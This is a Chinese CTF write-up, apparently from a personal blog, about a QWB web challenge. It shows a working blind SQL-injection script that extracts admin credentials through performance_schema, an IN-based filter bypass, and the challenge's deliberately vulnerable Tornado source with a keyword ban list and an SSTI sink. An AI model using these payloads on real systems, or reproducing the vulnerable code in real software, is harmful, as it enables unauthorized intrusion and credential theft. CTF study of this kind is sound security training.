<p><img src="image-20210625154443043.png" alt="image-20210625154443043"></p>
<p>表的节构则是通过查看events_statements_summary_by_digest 表，该表会记录所有的sql执行语句，通过随便捏两个登录，注册·等语句就会被记录到该表里面了，所以我们再注入即可</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select (DIGEST_TEXT) FROM performance_schema.events_statements_summary_by_digest</span><br></pre></td></tr></table></figure>

<p><img src="image-20210625154807355.png" alt="image-20210625154807355"></p>
<p>接下来就是去捏一个语句了,发现等号，大于号，小于号都被ban了，但我们可以用in语句进行绕过</p>
<figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">&#x27; or  if(1&gt;0,1,0)  or &#x27;0</span><br></pre></td></tr></table></figure>

<p><img src="image-20210625160455963.png" alt="image-20210625160455963"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line">for a in  range(1,300):</span><br><span class="line">    for i in range(130,-1,-1):</span><br><span class="line">        if(i&lt;30):</span><br><span class="line">            exit(0)</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;f96ea2c5-35a7-444f-8eee-4a086e4797dd.node3.buuoj.cn&#x2F;register.php?username&#x3D;&#39; or  if((ascii(substr((select group_concat(qwbqwbqwbuser,0x7e,qwbqwbqwbpass)  FROM qwbtttaaab111e ),&quot; + str(a) + &quot;,1)) in (&quot; + str(i) + &quot;)),1,0) or &#39;0&amp;password&#x3D;12&quot;</span><br><span class="line">        #admin~we111c000me_to_qwb</span><br><span class="line">        #url &#x3D; &quot;http:&#x2F;&#x2F;eci-2zece4hj2xonmso7ryud.cloudeci1.ichunqiu.com:8888&#x2F;register.php?username&#x3D;&#39; or  if((ascii(substr((select (DIGEST_TEXT)  FROM performance_schema.events_statements_summary_by_digest where SCHEMA_NAME in (&#39;qwb&#39;) limit 2,1),&quot;+str(a)+&quot;,1)) in (&quot;+str(i)+&quot;)),1,0) or &#39;0&amp;password&#x3D;12&quot;</span><br><span class="line">        #INSERT INTO &#96;qwbtttaaab111e&#96; ( &#96;qwbqwbqwbuser&#96; , &#96;qwbqwbqwbpass&#96; ) VALUES (...)</span><br><span class="line">        #url &#x3D; &quot;http:&#x2F;&#x2F;eci-2zece4hj2xonmso7ryud.cloudeci1.ichunqiu.com:8888&#x2F;register.php?username&#x3D;&#39; or  if((ascii(substr((select (file_name)  FROM performance_schema.file_instances limit 150,1),&quot;+str(a)+&quot;,1)) in (&quot;+str(i)+&quot;)),1,0) or &#39;0&amp;password&#x3D;12&quot;</span><br><span class="line">        time.sleep(0.5)</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        if &#39;this username&#39; in r.text:</span><br><span class="line">            print(chr(i),end&#x3D;&#39;&#39;)</span><br><span class="line">            break</span><br><span class="line">        else:</span><br><span class="line">            if(&#39;success&#39; in r.text):</span><br><span class="line">                pass</span><br><span class="line">            else:</span><br><span class="line">                print(r.text)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>之后把源码能够搞出来</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> tornado.ioloop, tornado.web, tornado.options, pymysql, os, re</span><br><span class="line">settings = &#123;<span class="string">&#x27;static_path&#x27;</span>: os.path.join(os.getcwd(), <span class="string">&#x27;static&#x27;</span>),</span><br><span class="line"> <span class="string">&#x27;cookie_secret&#x27;</span>: <span class="string">&#x27;b93a9960-bfc0-11eb-b600-002b677144e0&#x27;</span>&#125;</span><br><span class="line">db_username = <span class="string">&#x27;root&#x27;</span></span><br><span class="line">db_password = <span class="string">&#x27;xxxx&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MainHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> user <span class="keyword">and</span> user == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.render(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        username = self.get_argument(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`please input your password and username`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>) == <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            conn = pymysql.connect(<span class="string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="string">&#x27;qwb&#x27;</span>)</span><br><span class="line">            cursor = conn.cursor()</span><br><span class="line">            cursor.execute(<span class="string">&#x27;SELECT * from qwbtttaaab111e where qwbqwbqwbuser=%s and qwbqwbqwbpass=%s&#x27;</span>, [username, password])</span><br><span class="line">            results = cursor.fetchall()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) != <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">if</span> results[<span class="number">0</span>][<span class="number">1</span>] == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">                    self.set_secure_cookie(<span class="string">&#x27;user&#x27;</span>, <span class="string">&#x27;admin&#x27;</span>)</span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.commit()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    self.redirect(<span class="string">&#x27;/admin.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    cursor.close()</span><br><span class="line">                    conn.commit()</span><br><span class="line">                    conn.close()</span><br><span class="line">                    self.finish(<span class="string">&#x27;&lt;script&gt;alert(`login success, but only admin can get flag`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                    <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                cursor.close()</span><br><span class="line">                conn.commit()</span><br><span class="line">                conn.close()</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`your username or password is error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RegisterHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        username = self.get_argument(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        password = self.get_argument(<span class="string">&#x27;password&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        word_bans = [<span class="string">&#x27;table&#x27;</span>, <span class="string">&#x27;col&#x27;</span>, <span class="string">&#x27;sys&#x27;</span>, <span class="string">&#x27;union&#x27;</span>, <span class="string">&#x27;inno&#x27;</span>, <span class="string">&#x27;like&#x27;</span>, <span class="string">&#x27;regexp&#x27;</span>]</span><br><span class="line">        bans = [<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;=&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;--&#x27;</span>, <span class="string">&#x27;+&#x27;</span>]</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> word_bans:</span><br><span class="line">            <span class="keyword">if</span> re.search(ban, username, re.IGNORECASE):</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> username:</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> username <span class="keyword">or</span> <span class="keyword">not</span> password:</span><br><span class="line">            self.render(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&#x27;admin&#x27;</span>:</span><br><span class="line">            self.render(<span class="string">&#x27;register.html&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        conn = pymysql.connect(<span class="string">&#x27;localhost&#x27;</span>, db_username, db_password, <span class="string">&#x27;qwb&#x27;</span>)</span><br><span class="line">        cursor = conn.cursor()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&quot;SELECT qwbqwbqwbuser,qwbqwbqwbpass from qwbtttaaab111e where qwbqwbqwbuser=&#x27;%s&#x27;&quot;</span> % username)</span><br><span class="line">            results = cursor.fetchall()</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(results) != <span class="number">0</span>:</span><br><span class="line">                self.finish(<span class="string">&#x27;&lt;script&gt;alert(`this username had been used`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">                conn.commit()</span><br><span class="line">                conn.close()</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.commit()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            cursor.execute(<span class="string">&#x27;insert into qwbtttaaab111e (qwbqwbqwbuser, qwbqwbqwbpass) values(%s, %s)&#x27;</span>, [username, password])</span><br><span class="line">            conn.commit()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&quot;&lt;script&gt;alert(`success`);location.href=&#x27;/index.php&#x27;;&lt;/script&gt;&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            conn.rollback()</span><br><span class="line">            conn.close()</span><br><span class="line">            self.finish(<span class="string">&#x27;&lt;script&gt;alert(`error`);history.go(-1);&lt;/script&gt;&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LogoutHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.clear_all_cookies()</span><br><span class="line">        self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AdminHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user != <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/index.php&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        self.render(<span class="string">&#x27;admin.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ImageHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        user = self.get_secure_cookie(<span class="string">&#x27;user&#x27;</span>)</span><br><span class="line">        image_name = self.get_argument(<span class="string">&#x27;qwb_image_name&#x27;</span>, <span class="string">&#x27;header.jpeg&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> image_name:</span><br><span class="line">            self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> user <span class="keyword">or</span> user != <span class="string">b&#x27;admin&#x27;</span>:</span><br><span class="line">                self.redirect(<span class="string">&#x27;/&#x27;</span>, permanent=<span class="literal">True</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            <span class="keyword">if</span> image_name.endswith(<span class="string">&#x27;.py&#x27;</span>) <span class="keyword">or</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> image_name <span class="keyword">or</span> <span class="string">&#x27;..&#x27;</span> <span class="keyword">in</span> image_name:</span><br><span class="line">                self.finish(<span class="string">&quot;nonono, you can&#x27;t read it.&quot;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line">            image_name = os.path.join(os.getcwd() + <span class="string">&#x27;/image&#x27;</span>, image_name)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(image_name, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">                img = f.read()</span><br><span class="line">            self.set_header(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;image/jpeg&#x27;</span>)</span><br><span class="line">            self.finish(img)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SecretHandler</span>(<span class="params">tornado.web.RequestHandler</span>):</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(tornado.web.RequestHandler._template_loaders):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line"></span><br><span class="line">        msg = self.get_argument(<span class="string">&#x27;congratulations&#x27;</span>, <span class="string">&#x27;oh! you find it&#x27;</span>)</span><br><span class="line">        bans = []</span><br><span class="line">        <span class="keyword">for</span> ban <span class="keyword">in</span> bans:</span><br><span class="line">            <span class="keyword">if</span> ban <span class="keyword">in</span> msg:</span><br><span class="line">                self.finish(<span class="string">&#x27;bad hack,go out!&#x27;</span>)</span><br><span class="line">                <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;congratulations.html&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> (f):</span><br><span class="line">            f.write(<span class="string">&#x27;&lt;html&gt;&lt;head&gt;&lt;title&gt;congratulations&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;%s&quot;);location.href=\&#x27;/admin.php\&#x27;;&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;\n&#x27;</span> % msg)</span><br><span class="line">            f.flush()</span><br><span class="line">        self.render(<span class="string">&#x27;congratulations.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> tornado.web.RequestHandler._template_loaders:</span><br><span class="line">                tornado.web.RequestHandler._template_loaders[i].reset()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">make_app</span>():</span></span><br><span class="line">    <span class="keyword">return</span> tornado.web.Application([</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/index.php&#x27;</span>, MainHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/login.php&#x27;</span>, LoginHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/logout.php&#x27;</span>, LogoutHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/register.php&#x27;</span>, RegisterHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/admin.php&#x27;</span>, AdminHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/qwbimage.php&#x27;</span>, ImageHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/good_job_my_ctfer.php&#x27;</span>, SecretHandler),</span><br><span class="line">     (</span><br><span class="line">      <span class="string">&#x27;/&#x27;</span>, MainHandler)], **settings)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app = make_app()</span><br><span class="line">    app.listen(<span class="number">8000</span>)</span><br><span class="line">    tornado.ioloop.IOLoop.current().start()</span><br><span class="line">    print(<span class="string">&#x27;start&#x27;</span>)</span><br></pre></td></tr></table></figure>



<p>太迷惑了。。我读不出来东西</p>
<p><img src="image-20210625173437381.png" alt="image-20210625173437381"></p>
<p><img src="image-20210625173452887.png" alt="image-20210625173452887"></p>
<p><img src="image-20210625173501193.png" alt="image-20210625173501193"></p>
<p>被这题折腾了一天了，实在是心烦意乱没有心情继续了。摸了！</p>
]]></content>
      <tags>
        <tag>MYSQL</tag>
        <tag>SSTI</tag>
      </tags>
  </entry>
</search>
